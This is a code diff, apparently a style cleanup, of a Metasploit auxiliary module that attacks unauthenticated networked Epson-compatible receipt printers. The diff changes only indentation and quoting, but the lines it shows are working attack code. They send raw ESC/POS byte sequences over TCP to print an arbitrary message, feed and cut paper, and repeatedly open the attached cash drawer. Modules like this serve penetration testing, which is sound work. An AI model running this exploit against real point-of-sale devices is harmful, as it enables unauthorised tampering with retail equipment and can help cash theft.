@@ -5,23 +5,26 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
-  super(update_info(info,
-    'Name'        => 'ESC/POS Printer Command Injector',
-    'Description' => %q{
-      This module exploits an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers.
-      You can print a custom message, trigger the attached cash drawer, or do both.
-    },
-    'Author'      => ['FutileSkills'],
-    'License'     => MSF_LICENSE,
-    'References'  => [
-      ['URL', 'https://github.com/futileskills/Security-Advisory']
-    ],
-    'Notes'       => {
-      'Stability'   => [Metasploit::Module::Stability::CRASH_SAFE],
-      'Reliability' => [Metasploit::Module::Reliability::REPEATABLE_SESSION],
-      'SideEffects' => [Metasploit::Module::SideEffects::IOC_IN_LOGS, Metasploit::Module::SideEffects::PHYSICAL_EFFECTS]
-    }
-  ))
+    super(
+      update_info(
+        info,
+        'Name' => 'ESC/POS Printer Command Injector',
+        'Description' => %q{
+          This module exploits an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers.
+          You can print a custom message, trigger the attached cash drawer, or do both.
+        },
+        'Author' => ['FutileSkills'],
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['URL', 'https://github.com/futileskills/Security-Advisory']
+        ],
+        'Notes' => {
+          'Stability' => [Metasploit::Module::Stability::CRASH_SAFE],
+          'Reliability' => [Metasploit::Module::Reliability::REPEATABLE_SESSION],
+          'SideEffects' => [Metasploit::Module::SideEffects::IOC_IN_LOGS, Metasploit::Module::SideEffects::PHYSICAL_EFFECTS]
+        }
+      )
+  )
 
     register_options(
       [
@@ -64,14 +67,14 @@ class MetasploitModule < Msf::Auxiliary
       if print_message
         print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n"
         sock.put(print_commands)
-        print_good("Printed message.")
+        print_good('Printed message.')
       end
 
       if cut_paper
         print_status("Feeding #{feed_lines} lines and cutting paper...")
         sock.put(FEED_COMMAND + [feed_lines].pack('C'))
         sock.put(CUT_COMMAND)
-        print_good("Paper fed and cut.")
+        print_good('Paper fed and cut.')
       end
 
       if trigger_drawer
@@ -80,9 +83,8 @@ class MetasploitModule < Msf::Auxiliary
           sock.put(DRAWER_COMMAND)
           sleep(0.5)
         end
-        print_good("Triggered cash drawer.")
+        print_good('Triggered cash drawer.')
       end
-
     rescue ::Rex::ConnectionError
       print_error("Failed to connect to #{rhost_ip}")
     ensure
